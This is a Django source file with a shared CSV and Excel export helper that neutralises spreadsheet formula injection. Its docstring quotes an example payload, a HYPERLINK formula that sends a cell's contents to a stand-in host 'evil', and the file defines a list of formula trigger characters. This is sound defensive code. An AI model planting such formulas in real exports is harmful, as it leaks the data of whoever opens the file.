"""Shared CSV / Excel download helper.

Extracted from oelkaelder's `_report_response` so the ølkælder reports, the alumneliste export and the
værelsestjek AK overview all produce byte-identical downloads instead of three near-copies drifting
apart. Callers keep their own on-screen rendering; this only handles the `?format=` branches.

Every export carries text someone typed into a public or member form (an applicant's name, a
resident's study, a product name), so every export goes through here: a cell like
`=HYPERLINK("http://evil/?"&A2)` or `@SUM(...)` would otherwise run as a formula in the
spreadsheet of whoever opens the download (OWASP "CSV injection"). Two formats, two defences:

  * CSV has no cell types — Excel guesses from the first character — so a risky cell gets the
    OWASP `'` prefix (Excel hides it and shows the rest as text).
  * XLSX does have types, and only openpyxl's own guess makes a formula (any str starting with
    `=`). Forcing those cells back to string type keeps the exact text with no visible `'`.
"""

import csv
import io
import re

from django.http import HttpResponse

# First characters that make a spreadsheet treat a typed cell as a formula (tab/CR per OWASP too).
FORMULA_TRIGGERS = ("=", "+", "-", "@", "\t", "\r")
# A plain signed number like "-12,50" (ølkælder amounts): spreadsheets read it as a number, never a
# formula, so prefixing it would only turn a summable column into text.
_PLAIN_NUMBER = re.compile(r"[+-]?\d[\d.,]*")


def neutralise_formula(value: str) -> str:
    """`value` made safe for a CSV cell: a leading `'` when a spreadsheet would read it as a formula."""
    if value.startswith(FORMULA_TRIGGERS) and not _PLAIN_NUMBER.fullmatch(value):
        return "'" + value
    return value


def csv_or_xlsx_response(
    fmt: str | None, title: str, headers: list[str], data: list[list[str]], filename: str
) -> HttpResponse | None:
    """A CSV or Excel download for `?format=csv|xlsx`, or None when the caller should render HTML.

    Materialises every row in memory (openpyxl holds each cell as an object), so cap the row count at
    the call site for anything unbounded — see oelkaelder.views.EXPORT_MAX_ROWS.
    """
    if fmt == "xlsx":
        from openpyxl import Workbook

        wb = Workbook()
        ws = wb.active
        ws.title = title[:31]  # Excel's sheet-name limit
        for row in [headers, *data]:  # headers too: rooms' come from editable criterion names
            ws.append(row)
            for cell in ws[ws.max_row]:
                if cell.data_type == "f":  # openpyxl's guess for "=…"; nothing here is meant as one
                    cell.data_type = "s"
        buf = io.BytesIO()
        wb.save(buf)
        resp = HttpResponse(
            buf.getvalue(),
            content_type="application/vnd.openxmlformats-officedocument.spreadsheetml.sheet",
        )
        resp["Content-Disposition"] = f'attachment; filename="{filename}.xlsx"'
        return resp
    if fmt == "csv":
        resp = HttpResponse(content_type="text/csv; charset=utf-8")
        resp["Content-Disposition"] = f'attachment; filename="{filename}.csv"'
        resp.write("﻿")  # BOM so Excel renders Danish characters
        writer = csv.writer(resp)
        writer.writerows([neutralise_formula(str(v)) for v in row] for row in [headers, *data])
        return resp
    return None
